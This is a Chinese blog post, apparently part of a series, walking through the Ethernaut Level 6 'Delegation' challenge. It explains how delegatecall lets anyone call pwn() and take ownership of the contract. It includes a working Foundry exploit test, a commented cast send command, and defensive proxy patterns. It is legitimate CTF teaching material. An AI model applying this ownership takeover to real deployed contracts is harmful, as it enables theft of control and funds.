@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Ethernaut Level 6: Delegation - delegatecall 存储槽攻击 - Kent&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>KENT&#39;S BLOG</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  <h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
+<li><a href="/">首页</a></li>
+<li><a href="/archives">文章归档</a></li>
+<li><a href="/categories">分类浏览</a> </li>
+<li><a href="/tags">标签云</a></li>
+</ul>
+<h2 id="⛽-Gas-优化大师"><a href="#⛽-Gas-优化大师" class="headerlink" title="⛽ Gas 优化大师"></a>⛽ Gas 优化大师</h2><ul>
+<li><a href="/2025/09/12/gas-optimization-master-course/">Gas Optimization Master Course</a></li>
+</ul>
+<h2 id="🔗-Reth-公链开发"><a href="#🔗-Reth-公链开发" class="headerlink" title="🔗 Reth 公链开发"></a>🔗 Reth 公链开发</h2><ul>
+<li><a href="/categories/Reth%E5%BC%80%E5%8F%91">Reth 架构深度解析</a></li>
+<li><a href="/tags/Rust%E5%8C%BA%E5%9D%97%E9%93%BE">Rust + Ethereum 开发指南</a></li>
+<li><a href="/tags/%E6%89%A7%E8%A1%8C%E5%B1%82">自定义执行层实现</a></li>
+<li><a href="/tags/Layer2">Layer2 解决方案开发</a></li>
+</ul>
+<h2 id="🎯-MEV-前沿研究"><a href="#🎯-MEV-前沿研究" class="headerlink" title="🎯 MEV 前沿研究"></a>🎯 MEV 前沿研究</h2><ul>
+<li><a href="/categories/MEV%E7%A0%94%E7%A9%B6">MEV 基础概念</a></li>
+<li><a href="/tags/%E5%A5%97%E5%88%A9">套利策略分析</a></li>
+<li><a href="/tags/%E5%8C%BA%E5%9D%97%E6%9E%84%E5%BB%BA">区块构建优化</a></li>
+<li><a href="/tags/MEV%E6%9C%BA%E5%99%A8%E4%BA%BA">MEV Bot 开发实战</a></li>
+<li><a href="/tags/%E9%97%AA%E7%94%B5%E8%B4%B7">闪电贷套利策略</a></li>
+</ul>
+<h2 id="⚡-高性能区块链"><a href="#⚡-高性能区块链" class="headerlink" title="⚡ 高性能区块链"></a>⚡ 高性能区块链</h2><ul>
+<li><a href="/categories/%E5%B9%B6%E8%A1%8C%E6%89%A7%E8%A1%8C">并行执行引擎</a></li>
+</ul>
+<h2 id="Web3-0-专区"><a href="#Web3-0-专区" class="headerlink" title="Web3.0 专区"></a>Web3.0 专区</h2><ul>
+<li><a href="/categories/Dapp">Dapp 开发</a></li>
+<li><a href="/tags/solidity">智能合约</a></li>
+<li><a href="/tags/blockchain">区块链技术</a></li>
+<li><a href="/categories/Web3%E5%AE%89%E5%85%A8">Web3安全</a></li>
+</ul>
+<h2 id="Ethernaut-Foundry-系列-🛡️"><a href="#Ethernaut-Foundry-系列-🛡️" class="headerlink" title="Ethernaut&amp;Foundry 系列 🛡️"></a>Ethernaut&amp;Foundry 系列 🛡️</h2><ul>
+<li><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列总览</a></li>
+<li><a href="/2025/01/25/foundry-setup-guide/">Foundry 环境搭建</a></li>
+<li><a href="/2025/01/25/ethernaut-level-01-fallback/">Level 1: Fallback</a></li>
+<li><a href="/2025/01/25/ethernaut-level-02-fallout/">Level 2: Fallout</a></li>
+<li><a href="/2025/01/25/ethernaut-level-03-coinflip/">Level 3: Coin Flip</a></li>
+<li><a href="/2025/01/25/ethernaut-level-04-telephone/">Level 4: Telephone</a></li>
+<li><a href="/2025/01/25/ethernaut-level-05-token/">Level 5: Token</a></li>
+<li><a href="/2025/01/25/ethernaut-level-06-delegation/">Level 6: Delegation</a></li>
+<li><a href="/2025/01/25/ethernaut-level-07-force/">Level 7: Force</a></li>
+<li><a href="/2025/01/25/ethernaut-level-08-vault/">Level 8: Vault</a></li>
+<li><a href="/2025/01/25/ethernaut-level-09-king/">Level 9: King</a></li>
+<li><a href="/2025/01/25/ethernaut-level-10-reentrancy/">Level 10: Re-entrancy</a></li>
+<li><a href="/2025/01/25/ethernaut-level-11-elevator/">Level 11: Elevator</a></li>
+<li><a href="/2025/01/25/ethernaut-level-12-privacy/">Level 12: Privacy</a></li>
+<li><a href="/2025/01/25/ethernaut-level-13-gatekeeper-one/">Level 13: Gatekeeper One</a></li>
+<li><a href="/2025/01/25/ethernaut-level-14-gatekeeper-two/">Level 14: Gatekeeper Two</a></li>
+<li><a href="/2025/01/25/ethernaut-level-15-naught-coin/">Level 15: Naught Coin</a></li>
+<li><a href="/2025/01/25/ethernaut-level-16-preservation/">Level 16: Preservation</a></li>
+<li><a href="/2025/01/25/ethernaut-level-17-recovery/">Level 17: Recovery</a></li>
+<li><a href="/2025/01/25/ethernaut-level-18-magic-number/">Level 18: Magic Number</a></li>
+<li><a href="/2025/01/25/ethernaut-level-19-alien-codex/">Level 19: Alien Codex</a></li>
+<li><a href="/2025/01/25/ethernaut-level-20-denial/">Level 20: Denial</a></li>
+<li><a href="/2025/01/25/ethernaut-level-21-shop/">Level 21: Shop</a></li>
+<li><a href="/2025/01/25/ethernaut-level-22-dex/">Level 22: Dex</a></li>
+<li><a href="/2025/01/25/ethernaut-level-23-dex-two/">Level 23: Dex Two</a></li>
+<li><a href="/2025/01/25/ethernaut-level-24-puzzle-wallet/">Level 24: Puzzle Wallet</a></li>
+<li><a href="/2025/01/25/ethernaut-level-25-motorbike/">Level 25: Motorbike</a></li>
+</ul>
+<h2 id="个人页面"><a href="#个人页面" class="headerlink" title="个人页面"></a>个人页面</h2><ul>
+<li><a href="/about">关于我</a></li>
+<li><a href="/repository">项目展示</a></li>
+<li><a href="/books">书单推荐</a></li>
+<li><a href="/links">友情链接</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h1 id="🎯-Ethernaut-Level-6-Delegation-delegatecall-存储槽攻击"><a href="#🎯-Ethernaut-Level-6-Delegation-delegatecall-存储槽攻击" class="headerlink" title="🎯 Ethernaut Level 6: Delegation - delegatecall 存储槽攻击"></a>🎯 Ethernaut Level 6: Delegation - delegatecall 存储槽攻击</h1><blockquote>
+<p><strong>关卡链接</strong>: <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/level/6">Ethernaut Level 6 - Delegation</a><br><strong>攻击类型</strong>: delegatecall 存储槽攻击<br><strong>难度</strong>: ⭐⭐⭐⭐☆<br><strong>核心概念</strong>: 存储上下文切换、代理模式安全</p>
+</blockquote>
+<h2 id="📋-挑战目标"><a href="#📋-挑战目标" class="headerlink" title="📋 挑战目标"></a>📋 挑战目标</h2><p>这个关卡考验对 <code>delegatecall</code> 机制的深入理解：</p>
+<ol>
+<li><strong>获取合约控制权</strong> - 成为 <code>Delegation</code> 合约的 <code>owner</code></li>
+<li><strong>理解上下文切换</strong> - 掌握 <code>delegatecall</code> 的存储机制</li>
+<li><strong>学习代理模式风险</strong> - 了解升级模式的安全隐患</li>
+</ol>
+<h2 id="🔍-漏洞分析"><a href="#🔍-漏洞分析" class="headerlink" title="🔍 漏洞分析"></a>🔍 漏洞分析</h2><h3 id="合约源码分析"><a href="#合约源码分析" class="headerlink" title="合约源码分析"></a>合约源码分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;  // 🎯 目标函数：会修改 owner</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;      // 🚨 存储槽 0</span><br><span class="line">    Delegate delegate;         // 🚨 存储槽 1</span><br><span class="line"></span><br><span class="line">    constructor(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        // 🚨 危险的 delegatecall</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="核心概念：delegatecall-vs-call"><a href="#核心概念：delegatecall-vs-call" class="headerlink" title="核心概念：delegatecall vs call"></a>核心概念：delegatecall vs call</h3><table>
+<thead>
+<tr>
+<th>调用方式</th>
+<th>执行上下文</th>
+<th>存储修改</th>
+<th>msg.sender</th>
+<th>使用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>call</strong></td>
+<td>被调用合约</td>
+<td>被调用合约</td>
+<td>调用合约地址</td>
+<td>普通外部调用</td>
+</tr>
+<tr>
+<td><strong>delegatecall</strong></td>
+<td>调用合约</td>
+<td>调用合约</td>
+<td>原始调用者</td>
+<td>代理模式、升级</td>
+</tr>
+</tbody></table>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><strong>delegatecall 的工作机制</strong>：</p>
+<ul>
+<li>执行<strong>被调用合约的代码</strong></li>
+<li>使用<strong>调用合约的存储</strong></li>
+<li>保持<strong>原始的 msg.sender</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 当 Delegation 合约执行 delegatecall 时：</span><br><span class="line">delegate.delegatecall(abi.encodeWithSignature(&quot;pwn()&quot;));</span><br><span class="line"></span><br><span class="line">// 实际执行：</span><br><span class="line">// 1. 运行 Delegate.pwn() 的代码</span><br><span class="line">// 2. 但是在 Delegation 合约的存储上下文中</span><br><span class="line">// 3. owner = msg.sender; 修改的是 Delegation.owner (存储槽0)</span><br></pre></td></tr></table></figure>
+
+<h3 id="存储槽布局分析"><a href="#存储槽布局分析" class="headerlink" title="存储槽布局分析"></a>存储槽布局分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// Delegate 合约存储布局</span><br><span class="line">// 槽 0: address owner</span><br><span class="line"></span><br><span class="line">// Delegation 合约存储布局  </span><br><span class="line">// 槽 0: address owner     ← 这个会被 delegatecall 修改！</span><br><span class="line">// 槽 1: Delegate delegate</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击路径"><a href="#攻击路径" class="headerlink" title="攻击路径"></a>攻击路径</h3><ol>
+<li><strong>构造函数调用数据</strong> - 编码 <code>pwn()</code> 函数选择器</li>
+<li><strong>触发 fallback 函数</strong> - 向合约发送带数据的交易</li>
+<li><strong>执行 delegatecall</strong> - 在 Delegation 存储上下文中执行 <code>pwn()</code></li>
+<li><strong>获得控制权</strong> - <code>owner</code> 被设置为攻击者地址</li>
+</ol>
+<h2 id="💻-Foundry-实现"><a href="#💻-Foundry-实现" class="headerlink" title="💻 Foundry 实现"></a>💻 Foundry 实现</h2><h3 id="攻击合约代码"><a href="#攻击合约代码" class="headerlink" title="攻击合约代码"></a>攻击合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/Delegation.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract DelegationTest is Test &#123;</span><br><span class="line">    Delegate public delegate;</span><br><span class="line">    Delegation public delegation;</span><br><span class="line">    </span><br><span class="line">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class="line">    address public deployer = makeAddr(&quot;deployer&quot;);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.startPrank(deployer);</span><br><span class="line">        </span><br><span class="line">        // 部署 Delegate 合约</span><br><span class="line">        delegate = new Delegate(deployer);</span><br><span class="line">        </span><br><span class="line">        // 部署 Delegation 合约</span><br><span class="line">        delegation = new Delegation(address(delegate));</span><br><span class="line">        </span><br><span class="line">        vm.stopPrank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testDelegationExploit() public &#123;</span><br><span class="line">        console.log(&quot;Initial owner:&quot;, delegation.owner());</span><br><span class="line">        console.log(&quot;Attacker address:&quot;, attacker);</span><br><span class="line">        </span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        </span><br><span class="line">        // 🎯 关键攻击：构造 pwn() 函数调用</span><br><span class="line">        bytes memory payload = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class="line">        </span><br><span class="line">        // 通过 fallback 函数触发 delegatecall</span><br><span class="line">        (bool success,) = address(delegation).call(payload);</span><br><span class="line">        require(success, &quot;Attack failed&quot;);</span><br><span class="line">        </span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        </span><br><span class="line">        // 验证攻击成功</span><br><span class="line">        assertEq(delegation.owner(), attacker);</span><br><span class="line">        console.log(&quot;New owner:&quot;, delegation.owner());</span><br><span class="line">        console.log(&quot;Attack successful!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function testUnderstandDelegatecall() public &#123;</span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;=== Before Attack ===&quot;);</span><br><span class="line">        console.log(&quot;Delegation owner:&quot;, delegation.owner());</span><br><span class="line">        console.log(&quot;Delegate owner:&quot;, delegate.owner());</span><br><span class="line">        </span><br><span class="line">        // 直接调用 delegate.pwn() 只会修改 delegate 的存储</span><br><span class="line">        delegate.pwn();</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;=== After direct call to Delegate.pwn() ===&quot;);</span><br><span class="line">        console.log(&quot;Delegation owner:&quot;, delegation.owner()); // 不变</span><br><span class="line">        console.log(&quot;Delegate owner:&quot;, delegate.owner());     // 变为 attacker</span><br><span class="line">        </span><br><span class="line">        // 重置状态</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        vm.prank(deployer);</span><br><span class="line">        delegate = new Delegate(deployer);</span><br><span class="line">        </span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        </span><br><span class="line">        // 通过 delegatecall 调用 pwn()</span><br><span class="line">        bytes memory payload = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class="line">        (bool success,) = address(delegation).call(payload);</span><br><span class="line">        require(success, &quot;Delegatecall failed&quot;);</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;=== After delegatecall to pwn() ===&quot;);</span><br><span class="line">        console.log(&quot;Delegation owner:&quot;, delegation.owner()); // 变为 attacker!</span><br><span class="line">        console.log(&quot;Delegate owner:&quot;, delegate.owner());     // 不变</span><br><span class="line">        </span><br><span class="line">        vm.stopPrank();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function testFunctionSelector() public view &#123;</span><br><span class="line">        // 演示函数选择器的计算</span><br><span class="line">        bytes4 selector = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class="line">        console.log(&quot;pwn() selector:&quot;);</span><br><span class="line">        console.logBytes4(selector);</span><br><span class="line">        </span><br><span class="line">        bytes memory encoded = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class="line">        console.log(&quot;Encoded call data:&quot;);</span><br><span class="line">        console.logBytes(encoded);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="手动攻击脚本"><a href="#手动攻击脚本" class="headerlink" title="手动攻击脚本"></a>手动攻击脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 如果需要手动攻击，可以使用 cast 命令</span><br><span class="line">contract ManualAttack is Test &#123;</span><br><span class="line">    function testManualAttack() public &#123;</span><br><span class="line">        // 1. 计算函数选择器</span><br><span class="line">        bytes4 selector = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class="line">        console.logBytes4(selector);</span><br><span class="line">        </span><br><span class="line">        // 2. 使用 cast 发送交易</span><br><span class="line">        // cast send &lt;DELEGATION_ADDRESS&gt; &lt;SELECTOR&gt; --private-key &lt;YOUR_KEY&gt;</span><br><span class="line">        // 例如：cast send 0x... 0xdd365b8b --private-key ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行 Delegation 攻击测试</span></span><br><span class="line">forge <span class="built_in">test</span> --match-contract DelegationTest -vvv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预期输出：</span></span><br><span class="line"><span class="comment"># Initial owner: 0x... (deployer)</span></span><br><span class="line"><span class="comment"># Attacker address: 0x... (attacker) </span></span><br><span class="line"><span class="comment"># New owner: 0x... (attacker)</span></span><br><span class="line"><span class="comment"># Attack successful!</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a>🛡️ 防御措施</h2><h3 id="1-严格的存储布局匹配"><a href="#1-严格的存储布局匹配" class="headerlink" title="1. 严格的存储布局匹配"></a>1. 严格的存储布局匹配</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">contract SafeProxy &#123;</span><br><span class="line">    // ✅ 确保代理和实现合约有相同的存储布局</span><br><span class="line">    address public owner;           // 槽 0</span><br><span class="line">    address public implementation; // 槽 1</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function upgrade(address newImplementation) public onlyOwner &#123;</span><br><span class="line">        implementation = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        address impl = implementation;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // 使用内联汇编进行更安全的 delegatecall</span><br><span class="line">            calldatacopy(0, 0, calldatasize())</span><br><span class="line">            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)</span><br><span class="line">            returndatacopy(0, 0, returndatasize())</span><br><span class="line">            </span><br><span class="line">            switch result</span><br><span class="line">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class="line">            default &#123; return(0, returndatasize()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-使用-OpenZeppelin-的代理模式"><a href="#2-使用-OpenZeppelin-的代理模式" class="headerlink" title="2. 使用 OpenZeppelin 的代理模式"></a>2. 使用 OpenZeppelin 的代理模式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import &quot;@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SecureUpgradeableContract &#123;</span><br><span class="line">    // 使用 OpenZeppelin 的标准化代理实现</span><br><span class="line">    // 包含完整的安全检查和存储隔离</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-函数选择器白名单"><a href="#3-函数选择器白名单" class="headerlink" title="3. 函数选择器白名单"></a>3. 函数选择器白名单</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract RestrictedDelegation &#123;</span><br><span class="line">    mapping(bytes4 =&gt; bool) public allowedSelectors;</span><br><span class="line">    </span><br><span class="line">    constructor() &#123;</span><br><span class="line">        // 只允许特定函数被 delegatecall</span><br><span class="line">        allowedSelectors[bytes4(keccak256(&quot;safeFunction()&quot;))] = true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        bytes4 selector = bytes4(msg.data);</span><br><span class="line">        require(allowedSelectors[selector], &quot;Function not allowed&quot;);</span><br><span class="line">        </span><br><span class="line">        // 执行 delegatecall</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-存储槽隔离"><a href="#4-存储槽隔离" class="headerlink" title="4. 存储槽隔离"></a>4. 存储槽隔离</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract IsolatedStorage &#123;</span><br><span class="line">    // 使用 EIP-1967 标准存储槽</span><br><span class="line">    bytes32 private constant IMPLEMENTATION_SLOT = </span><br><span class="line">        bytes32(uint256(keccak256(&#x27;eip1967.proxy.implementation&#x27;)) - 1);</span><br><span class="line">    </span><br><span class="line">    bytes32 private constant ADMIN_SLOT = </span><br><span class="line">        bytes32(uint256(keccak256(&#x27;eip1967.proxy.admin&#x27;)) - 1);</span><br><span class="line">    </span><br><span class="line">    function _getImplementation() internal view returns (address) &#123;</span><br><span class="line">        return StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function _setImplementation(address newImplementation) internal &#123;</span><br><span class="line">        StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
